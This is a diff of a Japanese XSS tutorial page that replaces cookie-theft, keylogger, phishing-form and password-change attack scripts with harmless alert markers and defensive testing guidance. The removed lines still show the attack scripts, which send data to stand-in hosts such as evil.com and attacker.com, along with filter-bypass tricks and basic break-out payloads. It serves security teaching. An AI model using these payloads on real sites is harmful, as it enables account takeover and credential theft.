@@ -22,7 +22,7 @@
             <h1>XSS (Cross-Site Scripting)</h1>
             <p class="subtitle">
                 攻撃者が被害者のブラウザ上で任意の JavaScript を実行する。
-                BB で最も報告数が多い脆弱性クラスの1つ。
+                入力値を表示する機能を、ブラウザーの解釈から調べる。
             </p>
             <div style="margin-top:1rem;">
                 <span class="tag tag-theory">Theory</span>
@@ -35,6 +35,10 @@
             <div class="callout-title">Prerequisites (前提知識)</div>
             <p>Module 00 (HTTP) と Module 01 (Browser Security) を先に完了してください。特に SOP, Cookie, CSP の理解が XSS の impact を正しく評価するために必要です。</p>
         </div>
+
+        <nav class="callout" aria-label="XSSの学習ルート">
+            <p><strong>基礎を読んだ次は実務へ。</strong> <a href="10-xss-practical.html">WebPT・バグバウンティ向けXSS実務ガイド</a>で、入力の棚卸し、BurpとDevTools、CSP、影響評価、報告と再テストを17項目で学ぶ。<a href="10-xss-practical.html#field-exercises">ケース問題8問</a> ／ <a href="../labs/xss-flow.html">データフロー実習</a></p>
+        </nav>
 
         <section class="section" id="data-flow">
             <h2>まず1つの値を最後まで追う</h2>
@@ -123,27 +127,22 @@ sequenceDiagram
     participant Attacker as 攻撃者
     participant Victim as 被害者
     participant Server as 脆弱サーバー
-    participant Evil as 攻撃者サーバー
 
     Attacker->>Victim: 悪意あるURL/ページを送付
     Victim->>Server: リクエスト (payload含む)
     Server->>Victim: レスポンス (スクリプト反射/保存)
-    Note over Victim: ブラウザでJS実行
-    Victim->>Evil: document.cookie送信
-    Evil->>Attacker: Cookie窃取完了
-    Attacker->>Server: 被害者のCookieでアクセス (ATO)
+    Note over Victim: 対象originでJS実行
+    Victim->>Victim: テスト用マーカーを表示
+    Note over Victim,Server: 検査アカウントで到達可能なデータと操作を確認
             </div>
 
             <div class="callout">
                 <div class="callout-title">XSS の Impact (BB 観点)</div>
-                <p>
-                    単純な <code>alert(1)</code> だけでは Low〜Medium 評価になりがち。
-                    BB で高い severity を得るには <strong>実際の impact を示す</strong> ことが重要:
-                </p>
+                <p>実行を確認した後は、<strong>どの利用者の権限で、どのデータや操作に届くか</strong>を記録する。重要度は実際の影響と到達条件、対象プログラムの評価基準で判断する。</p>
                 <ul>
-                    <li>Account Takeover (ATO): セッション Cookie 窃取 or パスワード変更実行</li>
-                    <li>Stored XSS + Admin panel: 管理者の権限で任意操作</li>
-                    <li>Self-XSS + CSRF chain: 被害者に self-XSS を踏ませる</li>
+                    <li>実行時の origin と、閲覧する検査アカウントの権限</li>
+                    <li>閲覧に必要なクリック、ログイン、投稿・共有の条件</li>
+                    <li>同一 origin の読み取り・操作で確認できた影響と、追加認証などの制約</li>
                 </ul>
             </div>
         </div>
@@ -163,7 +162,7 @@ app.get('/search', (req, res) => {
 });
 
 // Attack URL
-https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code></pre>
+https://example.com/search?q=%3Cscript%3Ealert(location.origin)%3C%2Fscript%3E</code></pre>
 
             <h3>2. Stored XSS (Persistent XSS)</h3>
             <p>
@@ -174,18 +173,19 @@ https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/?
 &lt;div class="bio"&gt;${user.bio}&lt;/div&gt;
 
 // 攻撃者が bio に設定
-&lt;img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"&gt;</code></pre>
+&lt;img src=x onerror="alert(location.origin)"&gt;</code></pre>
 
             <h3>3. DOM-based XSS</h3>
             <p>
                 <strong>クライアントサイドの JavaScript が値をどの sink に渡すか</strong>で決まる。URL のフラグメントは HTTP リクエストに含まれない。一方、検索 API の応答や保存済みコメントも DOM-based XSS の source になり得る。
             </p>
 <pre><code>// 脆弱な JS コード
-const hash = location.hash.slice(1);
-document.getElementById('output').innerHTML = hash;
+const value = new URLSearchParams(location.hash.slice(1)).get('q') ?? '';
+document.getElementById('output').innerHTML = value;
 
 // Attack URL
-https://example.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
+https://example.com/page#q=%3Cimg%20src%3Dx%20onerror%3Dalert(location.origin)%3E</code></pre>
+            <p>URLSearchParams が q を URL デコードしてから HTML の sink に渡す構成。ブラウザーの location.hash は山括弧などをエンコードした値を返す場合があるので、実際に渡った文字列を DevTools で確認する。このサンプルのインラインイベント処理は CSP が許す場合に実行できる。</p>
 
             <p>Source は値を取り込む場所、Sink はその値を HTML・コード・URL などとして解釈する場所。たとえば検索語を検索結果の見出しに表示するときは、URL から読み取った値が、途中で加工・保存された後も最後までテキストとして扱われるかを追う。</p>
 
@@ -226,21 +226,22 @@ https://example.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</code>
         <div class="section">
             <h2>XSS の検出方法</h2>
 
-            <h3>Step 1: Reflection Point の発見</h3>
+            <h3>Step 1　入力が現れる場所を見つける</h3>
             <ol>
                 <li>全ての入力ポイントに一意のプローブ文字列を送る (例: <code>xss123test</code>)</li>
                 <li>レスポンス内でプローブがどこに出力されるか確認</li>
                 <li>出力コンテキストを特定: HTML body? 属性内? JavaScript 内? URL 内?</li>
             </ol>
 
-            <h3>Step 2: コンテキスト別 Payload</h3>
+            <h3>Step 2　出力コンテキストと実行条件</h3>
+            <p>次の例はアプリが入力を未処理のまま、その文脈に連結する場合を示す。HTTP 応答の HTML と、JavaScript が後から挿入する DOM で挙動が変わる。要素の生成、イベントの発火、CSP による実行可否を順に観察する。</p>
             <table>
                 <thead><tr><th>コンテキスト</th><th>例</th><th>Break-out payload</th></tr></thead>
                 <tbody>
                     <tr>
                         <td>HTML body</td>
                         <td><code>&lt;p&gt;USER_INPUT&lt;/p&gt;</code></td>
-                        <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                        <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code><br>innerHTML で挿入した script 要素は通常実行されない。イベント属性の例はそのイベントと CSP の条件に依存する。</td>
                     </tr>
                     <tr>
                         <td>HTML 属性 (quoted)</td>
@@ -259,205 +260,112 @@ https://example.com/page#&lt;img src=x onerror=alert(document.domain)&gt;</code>
                     </tr>
                     <tr>
                         <td>JavaScript template literal</td>
-                        <td><code>var x = `${USER_INPUT}`;</code></td>
+                        <td><code>var x = `USER_INPUT`;</code><br>サーバーが USER_INPUT の位置に入力を連結する構成</td>
                         <td><code>${alert(1)}</code></td>
                     </tr>
                     <tr>
-                        <td>href/src 属性</td>
+                        <td>リンクの href 属性</td>
                         <td><code>&lt;a href="USER_INPUT"&gt;</code></td>
-                        <td><code>javascript:alert(1)</code></td>
+                        <td><code>javascript:alert(1)</code><br>リンクが操作され、CSP が実行を許す場合。script の src、img の src はそれぞれ別の読み込み規則を持つ。</td>
                     </tr>
                     <tr>
                         <td>CSS</td>
                         <td><code>background: url(USER_INPUT)</code></td>
-                        <td>(現代ブラウザではほぼ不可能)</td>
+                        <td>CSS の入力と JavaScript の実行は別々に確認する。現代ブラウザーでは CSS の expression() のような旧式のコード実行は使えない。外部リソース要求や表示変更は CSS injection の影響として評価する。</td>
                     </tr>
                 </tbody>
             </table>
 
-            <h3>Step 3: Filter / WAF Bypass</h3>
+            <h3>Step 3　フィルターとデコードの差を確かめる</h3>
             <ul>
-                <li><strong>Case variation</strong>: <code>&lt;ScRiPt&gt;</code>, <code>&lt;IMG SRC=x ONERROR=alert(1)&gt;</code></li>
-                <li><strong>Event handler 列挙</strong>: <code>onload, onerror, onfocus, onmouseover, onanimationend...</code></li>
-                <li><strong>Tag 列挙</strong>: <code>&lt;svg&gt;, &lt;math&gt;, &lt;details&gt;, &lt;video&gt;, &lt;body&gt;...</code></li>
-                <li><strong>Encoding</strong>: HTML entity (<code>&amp;#x61;lert(1)</code>), Unicode escapes (JS内)</li>
-                <li><strong>Double encoding</strong>: <code>%253Cscript%253E</code> (サーバーが2回 decode する場合)</li>
-                <li><strong>Null byte</strong>: <code>%00</code> (一部パーサーでの切り捨て)</li>
-                <li><strong>Dangling markup</strong>: 完全なスクリプト注入が無理な場合、属性を壊してデータを外部に送る</li>
+                <li><strong>1項目ずつ比較する</strong>。元の入力と、タグ名の大文字・小文字、属性、引用符などを一つ変えた入力で、応答と最終 DOM を比べる。</li>
+                <li><strong>デコードの順序を記録する</strong>。URL エンコード、HTML 実体参照、JSON のエスケープが、どこで元の文字になるかを追う。二重デコードの存在は、その層で読んだ実際の値から判断する。</li>
+                <li><strong>制限のある文脈を切り分ける</strong>。許可タグ・属性、イベントが発生する操作、入力長、CSP の有無を分けて記録する。</li>
+                <li><strong>応答を変えた層を確認する</strong>。WAF の拒否、アプリ側の検証、サニタイザーによる変更、ブラウザーの正規化を、HTTP 応答と Elements の違いから調べる。</li>
             </ul>
-
             <div class="callout">
                 <div class="callout-title">自動化ツール</div>
                 <ul>
-                    <li><strong>Burp Intruder</strong>: tag/event handler の全組み合わせを自動テスト</li>
-                    <li><strong>XSStrike</strong>: DOM / Reflected 両方を自動検出</li>
-                    <li><strong>dalfox</strong>: パラメータ単位の XSS スキャナー</li>
+                    <li><strong>Burp Intruder</strong> で入力差分を比較する。対象の制約と通信量に合わせて候補を絞る。</li>
+                    <li><strong>XSStrike</strong> の検出候補を、対象ブラウザーの実行経路と実際のトリガーで再確認する。</li>
+                    <li><strong>dalfox</strong> でパラメーター単位の候補を探す。保存先や別権限の閲覧経路は手動確認も組み合わせる。</li>
                 </ul>
             </div>
         </div>
 
         <!-- 防御と bypass -->
         <div class="section">
-            <h2>防御手法とその Bypass</h2>
+            <h2>防御手法と検証する条件</h2>
 
             <h3>HTML Encoding</h3>
             <p>
                 <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>"</code> → <code>&amp;quot;</code> 等。
                 <strong>正しく実装されていれば HTML body context の XSS は防げる。</strong>
             </p>
-            <p>Bypass: JavaScript context 内では HTML encoding が効かない。<code>var x = '{{input}}'</code> に <code>'; alert(1); //</code> を入れても encoding されない。</p>
+            <p>インラインの script 内やイベント属性では、HTML と JavaScript の解析規則が重なる。使っているエンコーダーがどの文脈を対象にするかを確認する。API の JSON をデータとして読み、関数の引数や textContent に渡す設計にすると、コードへ文字列を連結する箇所を減らせる。</p>
 
             <h3>Blocklist フィルター</h3>
             <p>
                 <code>&lt;script&gt;</code> や <code>alert</code> をブロック。
             </p>
-            <p>Bypass: 別のタグ + event handler (<code>&lt;img onerror&gt;</code>)、別の関数 (<code>confirm</code>, <code>prompt</code>, <code>print</code>, <code>window['al'+'ert'](1)</code>)</p>
+            <p>特定の単語の削除では、HTML パーサーが解釈できる他の要素や属性を覆いきれない。本文表示なら文脈に合う出力エンコード、装飾を許すなら許可ポリシーを持つ HTML サニタイザーを適用する。</p>
 
             <h3>WAF (Web Application Firewall)</h3>
-            <p>ネットワークレベルで payload を検知してブロック。</p>
-            <p>Bypass: chunked encoding, HTTP/2 binary framing, Unicode normalization, parameter pollution</p>
+            <p>HTTP 通信を検査して、規則に一致した要求や応答を遮断する追加の防御。CDN・WAF・アプリで正規化の方法が違うかを、実際の要求と応答で確かめる。HTTP/2 や chunked 転送を使ったときも、検査層が読み取る値とアプリが処理する値を比較して判断する。</p>
 
             <h3>CSP (Content Security Policy)</h3>
-            <p>XSS が成功しても、スクリプトの実行を制限する defense-in-depth。</p>
-            <p>Bypass: CSP module (01-browser-security.html) 参照。unsafe-inline, JSONP on whitelisted domain, base-uri 等。</p>
+            <p>ブラウザーで読み込み先や実行可能なコードを制限する追加の防御。実際に配信された強制ポリシーと Report-Only、フォールバックする directive、実行時の違反を確認する。複数の強制ポリシーがある場合はすべての制約が適用される。<a href="01-browser-security.html">Browser Security</a> と <a href="10-xss-practical.html#csp">実務編の CSP 調査</a>で詳しく学ぶ。</p>
         </div>
 
         <!-- Impact demonstration -->
         <div class="section">
-            <h2>Impact Demonstration (BB report で使う)</h2>
-
-            <h3>Session 窃取 (HttpOnly なし)</h3>
-<pre><code>&lt;script&gt;
-fetch('https://attacker.com/log?c=' + document.cookie);
-&lt;/script&gt;</code></pre>
-
-            <h3>Account Takeover (パスワード変更)</h3>
-<pre><code>&lt;script&gt;
-// CSRF token を取得してパスワードを変更
-fetch('/settings')
-  .then(r => r.text())
-  .then(html => {
-    const token = html.match(/csrf_token.*?value="(.*?)"/)[1];
-    fetch('/settings/password', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: `csrf=${token}&new_password=hacked123&confirm=hacked123`
-    });
-  });
-&lt;/script&gt;</code></pre>
-
-            <h3>Keylogger</h3>
-<pre><code>&lt;script&gt;
-document.onkeypress = e => {
-  fetch('https://attacker.com/keys?k=' + e.key);
-};
-&lt;/script&gt;</code></pre>
-
-            <h3>Phishing (偽ログインフォーム)</h3>
-<pre><code>&lt;script&gt;
-document.body.innerHTML = `
-  &lt;h2&gt;Session expired. Please login again.&lt;/h2&gt;
-  &lt;form action="https://attacker.com/phish" method="POST"&gt;
-    &lt;input name="email" placeholder="Email"&gt;
-    &lt;input name="password" type="password" placeholder="Password"&gt;
-    &lt;button&gt;Login&lt;/button&gt;
-  &lt;/form&gt;`;
-&lt;/script&gt;</code></pre>
-
-            <div class="callout danger">
-                <div class="callout-title">注意: BB report での PoC</div>
-                <p>
-                    実際のBBレポートでは <code>alert(document.domain)</code> または <code>alert(document.cookie)</code> で十分。
-                    実際に Cookie を外部に送信する PoC は <strong>自分の管理下のサーバーに限定</strong> し、
-                    他のユーザーに影響を与えないこと。
-                </p>
-            </div>
+            <h2>実行と影響を段階的に確認する</h2>
+            <p>実行を調べるときは、入力する検査アカウント A と、閲覧する検査アカウント B を用意する。B が通常の画面操作で入力を読み込み、実行が起きた origin と必要なクリックを記録する。Console への手入力はコードの挙動を確認する操作なので、報告には画面からそのコードへ届く経路を示す。</p>
+            <table>
+                <thead><tr><th>確認するもの</th><th>前提として確かめること</th><th>残す最小限の証拠</th></tr></thead>
+                <tbody>
+                    <tr><td>別利用者の閲覧時の実行</td><td>A の入力を B が閲覧でき、対象文脈と CSP で実行が可能</td><td>入力の保存・共有手順、B の通常の閲覧操作、テスト用マーカーと location.origin</td></tr>
+                    <tr><td>同一 origin のデータ読み取り</td><td>B のセッションで対象 API を読める。HttpOnly は JavaScript による Cookie の直接参照を制限する</td><td>検査用データだけを使った API 応答と、読み取れた項目</td></tr>
+                    <tr><td>権限を使う操作</td><td>対象操作の権限、再認証・現在のパスワード・MFA の要求、必要なトークン</td><td>検査アカウントに対する可逆な操作の前後と、成立した範囲</td></tr>
+                    <tr><td>別 origin・sandbox の制約</td><td>実行中の frame、sandbox 属性、文書の origin、親画面へのアクセス条件</td><td>対象文書の URL と設定。到達を確認したデータと到達条件</td></tr>
+                </tbody>
+            </table>
+            <p>同じコードでも、ログイン状態・ブラウザー・frame・クリック条件で結果が変わる。ポップアップの可否だけに依存せず、DevTools の実行結果と通常の閲覧経路を併せて残す。<a href="10-xss-practical.html#impact">実務編の影響評価と報告</a>で、前提条件を含む記録例を確認できる。</p>
         </div>
 
         <!-- Real-world examples -->
         <div class="section">
             <h2>Real-World Reports (HackerOne 実例解析)</h2>
-            <p>
-                実際に報奨金が支払われた XSS レポートから、<strong>どこで見つけたか・どう chain したか・なぜ高額になったか</strong>を分析する。
-                出典: <a href="https://github.com/reddelexc/hackerone-reports" target="_blank">hackerone-reports (Top by bug type)</a>
-            </p>
+            <p>公開レポートの要約から、入力が通る機能と調査の観点を整理する。各リンクの原文で報告時の前提条件、修正、再テストまで確認しよう。タイトルや要約で確認できる範囲をここに記載した。</p>
 
-            <h3>Case 1: PayPal Stored XSS via Cache Poisoning ($18,900 + $20,000)</h3>
+            <h3>Case 1　PayPal のキャッシュされたリダイレクト</h3>
             <div class="card">
-                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/488147" target="_blank">#488147</a> + <a href="https://hackerone.com/reports/510152" target="_blank">#510152</a> (bypass)</p>
-                <p><strong>仕組み:</strong></p>
-                <ol>
-                    <li>PayPal のログインページ (<code>paypal.com/signin</code>) が CDN 経由で配信されている</li>
-                    <li>攻撃者が Cache Poisoning でログインページの HTML に悪意ある script を注入</li>
-                    <li>キャッシュされた汚染ページが <strong>全ユーザーに配信</strong> される (Stored XSS 相当)</li>
-                    <li>ログインフォームのクレデンシャルを窃取 → Account Takeover</li>
-                </ol>
-                <p><strong>なぜ高額:</strong></p>
-                <ul>
-                    <li>ログインページ = 全ユーザーが通るクリティカルパス</li>
-                    <li>Cache Poisoning で「攻撃者のアクション1回」で全ユーザーに影響</li>
-                    <li>最初の修正をbypassした #510152 がさらに $20,000</li>
-                </ul>
-                <p><strong>学び:</strong> XSS 単体では Medium だが、Cache Poisoning と組み合わせると
-                Stored 相当 + mass impact になり Critical に昇格する。Phase 4 の <a href="45-cache-poisoning.html">Web Cache Poisoning</a> で詳細。</p>
+                <p>公開要約では、フロントエンドとキャッシュサーバーの構成により、request smuggling でページ要求をキャッシュされたリダイレクトに変換できた。そのリダイレクトを利用者が開くと、要求したページに代わり攻撃者のコンテンツが表示される。<a href="https://hackerone.com/reports/488147">#488147</a> ／ <a href="https://hackerone.com/reports/510152">再修正に関する #510152</a></p>
+                <p>調査では、キャッシュキー、汚染される応答、保存期間、影響するリクエストの条件を分けて記録する。<a href="45-cache-poisoning.html">Web Cache Poisoning</a>でキャッシュの仕組みを復習できる。</p>
             </div>
 
-            <h3>Case 2: Reddit 1-Click ATO via Apple Sign-In + XSS (500 upvotes)</h3>
+            <h3>Case 2　Reddit の Apple Sign-In とアカウント乗っ取り</h3>
             <div class="card">
-                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1567186" target="_blank">#1567186</a> (500 upvotes)</p>
-                <p><strong>仕組み:</strong></p>
-                <ol>
-                    <li>Apple Sign-In の OAuth flow で <code>response_type</code> を <code>code</code> から <code>code id_token</code> に変更</li>
-                    <li>Apple が id_token を <strong>fragment (#)</strong> に付けて redirect する</li>
-                    <li>Redirect 先が <code>www.redditmedia.com</code> (XSS あり) を経由</li>
-                    <li>XSS で fragment の id_token を窃取 → 被害者のアカウントに Apple Sign-In でログイン</li>
-                </ol>
-                <p><strong>学び:</strong> OAuth の response_type 変更 + open redirect + XSS の 3-step chain。
-                単体では Low の XSS が <strong>OAuth token theft</strong> の踏み台になると Critical。
-                Phase 4 の <a href="42-oauth-attacks.html">OAuth Attacks</a> で詳細。</p>
+                <p>タイトルでは response-type の切り替えと、www.redditmedia.com の XSS へ href が漏れる経路を組み合わせたアカウント乗っ取りを報告している。公開要約では Apple Sign-In の code や access token を取得できると説明している。<a href="https://hackerone.com/reports/1567186">#1567186</a></p>
+                <p>フロー図を作り、各段階で文書の origin、state、応答に含まれる値、その値を次に読むコードを追う。<a href="42-oauth-attacks.html">OAuth Attacks</a>で認証フローの前提を確認できる。</p>
             </div>
 
-            <h3>Case 3: GitLab Stored XSS via Kroki Diagram ($13,950)</h3>
+            <h3>Case 3　GitLab Kroki の画像要素へ属性が入る経路</h3>
             <div class="card">
-                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1731349" target="_blank">#1731349</a> (292 upvotes)</p>
-                <p><strong>仕組み:</strong></p>
-                <ol>
-                    <li>GitLab の Markdown 内で Kroki ダイアグラムを埋め込める機能</li>
-                    <li>Kroki のレンダリング結果 (SVG) が <strong>サニタイズ不足</strong>で返される</li>
-                    <li>SVG 内に <code>&lt;script&gt;</code> や event handler を含めると実行される</li>
-                    <li>Issue / MR の description に書くだけで、閲覧者全員に XSS が発火 (Stored)</li>
-                </ol>
-                <p><strong>学び:</strong> Markdown レンダラーの外部サービス連携 (Kroki, Mermaid 等) は XSS の温床。
-                SVG は「画像」だが script を含められる。<code>Content-Type: image/svg+xml</code> で inline 表示されると危険。</p>
+                <p>Kroki を有効にしている場合、細工した pre ブロックから生成される img タグに任意属性を注入できた。公開要約では、対象の code 要素を探すセレクターと、図の種類を選ぶ lang 属性の扱いに言及している。<a href="https://hackerone.com/reports/1731349">#1731349</a></p>
+                <p>レンダラーが入力のどの値から要素名・属性・URL を作るかを追う。外部ライブラリが生成した HTML にも出力先の文脈を確認する必要がある。</p>
             </div>
 
-            <h3>Case 4: Shopify DOM XSS via postMessage ($9,400)</h3>
+            <h3>Case 4　Shopify の Jamf Pro にあった古い Swagger UI</h3>
             <div class="card">
-                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/1444682" target="_blank">#1444682</a> (234 upvotes)</p>
-                <p><strong>仕組み:</strong></p>
-                <ol>
-                    <li>Shopify の管理画面が <code>window.addEventListener('message', ...)</code> でクロスオリジンメッセージを受信</li>
-                    <li>Origin の検証が不十分 (正規表現のミス or 未検証)</li>
-                    <li>攻撃者の iframe から <code>postMessage</code> で DOM に HTML を注入</li>
-                    <li>Admin セッションで任意操作が可能に</li>
-                </ol>
-                <p><strong>学び:</strong> <code>postMessage</code> は DOM XSS の主要 source。
-                検出方法: JS ファイル内で <code>addEventListener('message'</code> を grep → handler 内で origin チェックの有無を確認 → innerHTML / eval 等の sink に到達するか追跡。</p>
+                <p>公開要約によると、jamfpro.shopifycloud.com の <code>/classicapi/doc/</code> で古い Swagger UI が公開され、細工した URL からアプリの文脈で XSS を実行できた。修正ではこのエンドポイントへのアクセスを除去している。<a href="https://hackerone.com/reports/1444682">#1444682</a></p>
+                <p>API ドキュメントの画面も調査対象になる。依存する UI のバージョン、URL から取り込む設定、読み込まれる外部定義、実行文書の origin を調べる。</p>
             </div>
 
-            <h3>Case 5: Valve (Steam) XSS → RCE via Electron ($7,500)</h3>
+            <h3>Case 5　Valve の React 製 Steam チャット</h3>
             <div class="card">
-                <p><strong>Report:</strong> <a href="https://hackerone.com/reports/409850" target="_blank">#409850</a> (485 upvotes)</p>
-                <p><strong>仕組み:</strong></p>
-                <ol>
-                    <li>Steam のチャットクライアントが React ベースで、一部の入力がサニタイズされていない</li>
-                    <li>チャットメッセージ内の特定のフォーマットで XSS が発火</li>
-                    <li>Steam クライアント = <strong>Electron ベース</strong> → XSS が Node.js コンテキストで動く</li>
-                    <li>Node.js API 経由でローカルファイルの読み書き、コマンド実行が可能 (RCE)</li>
-                </ol>
-                <p><strong>学び:</strong> Electron アプリの XSS は Web アプリの XSS と比べて <strong>impact が桁違い</strong>。
-                <code>nodeIntegration: true</code> / <code>contextIsolation: false</code> の設定だと XSS = RCE。
-                Desktop アプリの BB プログラムは特に狙い目。</p>
+                <p>タイトルは Steam の React チャットクライアントにおける XSS。公開要約の導入では、React の保護と危険な描画機能の利用を避けた構成、CSP に触れている。どの経路でその保護の外に入力が届いたかを原文で追う読書課題にできる。<a href="https://hackerone.com/reports/409850">#409850</a></p>
+                <p>デスクトップアプリを調べる場合は、描画プロセスからアクセスできる API と、preload や IPC の権限境界を別に確認する。Electron では Node.js integration、context isolation、sandbox、IPC の検証などが影響範囲を左右する。<a href="https://www.electronjs.org/docs/latest/tutorial/security">Electron のセキュリティ指針</a></p>
             </div>
 
             <h3 id="hackerone-reading-list">テーマ別に読む HackerOne 公開レポート 20 選</h3>
@@ -499,32 +407,18 @@ document.body.innerHTML = `
                 <li><a href="https://hackerone.com/reports/683298">MoPub #683298</a> — ログイン画面の XSS とオープンリダイレクト</li>
             </ul>
 
-            <h3>高額 XSS のパターン分析</h3>
+            <h3>事例から調べる前提条件と証拠</h3>
             <table>
-                <thead><tr><th>パターン</th><th>Impact 上昇理由</th><th>報奨金レンジ</th></tr></thead>
+                <thead><tr><th>調査する経路</th><th>成立に必要な前提</th><th>記録する証拠</th></tr></thead>
                 <tbody>
-                    <tr><td>Stored XSS + Admin panel</td><td>管理者の全権限を奪取</td><td>$5,000 ~ $16,000</td></tr>
-                    <tr><td>XSS + OAuth token theft</td><td>1-click ATO (全ユーザー)</td><td>$5,000 ~ $20,000</td></tr>
-                    <tr><td>XSS + Cache Poisoning</td><td>Mass impact (全閲覧者)</td><td>$10,000 ~ $20,000</td></tr>
-                    <tr><td>XSS in Electron/Desktop</td><td>XSS = RCE</td><td>$7,500 ~ $20,000</td></tr>
-                    <tr><td>Blind XSS (admin panel hit)</td><td>Internal system への影響</td><td>$1,000 ~ $5,000</td></tr>
-                    <tr><td>認証ドメインの XSS</td><td>Credential 窃取が直接可能</td><td>$5,000 ~ $15,000</td></tr>
-                    <tr><td>CSP bypass 付き Stored XSS</td><td>防御を突破した証明</td><td>$5,000 ~ $14,000</td></tr>
+                    <tr><td>保存した入力を管理画面が表示</td><td>入力者から管理者の閲覧まで到達し、管理画面の origin で実行できる</td><td>入力先と表示先、検査用の役割、保存から閲覧までの操作</td></tr>
+                    <tr><td>認証フローの値を別の画面が読む</td><td>漏れる値が認証に使え、その値を読める origin と経路がある</td><td>値の種類、フロー、state の扱い、検査アカウントで確認した結果</td></tr>
+                    <tr><td>キャッシュ経由で別の利用者へ表示</td><td>汚染応答が共有され、対象条件の要求に再利用される</td><td>キャッシュキー、対象 URL、保持期間、独立した検査クライアントの応答</td></tr>
+                    <tr><td>デスクトップの描画から特権 API へ到達</td><td>利用可能なブリッジ、IPC、Node.js API に必要な操作権限がある</td><td>アプリのバージョン、プロセスと権限の境界、実際に呼べた API</td></tr>
+                    <tr><td>Blind XSS のコールバックを検知</td><td>入力を後から別画面が処理し、コールバックの発信元を特定できる</td><td>入力ごとの識別子、発生時刻、実行文書の情報。URL の取得だけならクローラー等の可能性も調べる</td></tr>
                 </tbody>
             </table>
-
-            <div class="callout success">
-                <div class="callout-title">低額 XSS を避けるには</div>
-                <p>
-                    <strong>Self-XSS</strong> (自分にしか影響しない) や <strong>CSP で完全にブロックされる XSS</strong> は
-                    Informative / Low 扱いになりがち。report 前に以下を確認:
-                </p>
-                <ul>
-                    <li>被害者が攻撃者の link をクリック or ページを閲覧するだけで発火するか？</li>
-                    <li>CSP が <code>script-src 'self'</code> のみで bypass 不可能ではないか？</li>
-                    <li>Impact を ATO / data theft / privilege escalation まで chain できるか？</li>
-                </ul>
-            </div>
+            <p>Self-XSS を調べるときも、入力者と閲覧者を分けた再現経路があるかを確認する。CSP の違反だけが見える場合は、配信されたポリシーと到達した sink を記録する。重要度と報奨金は、対象プログラムの基準と確認できた影響に基づいて評価する。</p>
         </div>
 
         <!-- Practice -->
@@ -553,10 +447,10 @@ document.body.innerHTML = `
                 <ul>
                     <li><strong>出力コンテキスト</strong>を必ず特定する — HTML body, 属性, JS 内, URL で payload が全く違う</li>
                     <li><strong>DOM-based はブラウザー側の処理を追う</strong> — HTTP 応答の値も source になり得る</li>
-                    <li><strong>Impact を示す</strong> — alert() だけでなく ATO/data theft の PoC を付ける</li>
+                    <li><strong>Impact を示す</strong> — 実行 origin、検査アカウントの権限、到達条件と確認できたデータ・操作を記録する</li>
                     <li><strong>影響範囲を記録する</strong> — 表示する人の権限、入力の残る期間、閲覧に必要な操作を区別する</li>
-                    <li><strong>CSP は defence-in-depth</strong> — XSS が見つかっても CSP が堅ければ severity は下がる</li>
-                    <li><strong>mXSS</strong> — HTML サニタイザーを使っていても安心できない（ブラウザの DOM 正規化で突破される）</li>
+                    <li><strong>CSP は defence-in-depth</strong> — 強制ポリシーと Report-Only、実行時の制約を確認して影響を評価する</li>
+                    <li><strong>mXSS</strong> — サニタイズ時と最終表示時の DOM の違いから、実行可能な構造が生じる条件を調べる</li>
                 </ul>
             </div>
         </div>
